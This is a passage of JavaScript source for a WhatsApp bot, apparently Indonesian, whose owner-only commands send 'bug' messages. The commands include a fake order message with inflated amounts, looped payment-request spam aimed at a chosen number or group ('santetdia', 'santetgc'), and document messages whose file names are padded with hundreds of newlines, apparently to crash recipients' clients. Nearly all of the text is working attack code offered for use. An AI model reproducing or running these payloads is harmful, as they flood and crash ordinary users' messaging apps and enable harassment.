 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
liaacans.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
}
break
case 'poll': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT Auliahost-BOT",
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM BROTHER BY Auliahost-BOT"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
m.reply('sukses sendbug')
}
break
case 'troli2': {
if (!isCreator) throw mess.owner
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
						"orderId": "449756950375071",
						"thumbnail": "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",
						"itemCount": 7,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"priceAmount1000": "10000000",
						"message": `©Auliahost-BOT`,
"jpegThumbnail":fs.readFileSync('./image/thumbnail.jpg'),
"orderTitle": `Bug By Hw Mods`,
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",
						"totalAmount1000": "35000000",
						"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'santetdia': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
anjay(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `©Auliahost-BOT`,
}
}}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'santetgc': {
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `Created ©Auliahost-BOT`,
}
}}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'docu': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 RAHMXMODS ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
liaacans.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'duc': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
						"mimetype": "*/*",
						"title": "IMG-20220802-WA0052.jpeg",
						"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
						"pageCount": 0,
						"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
						"fileName": `🔥 RAHMXMODS ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal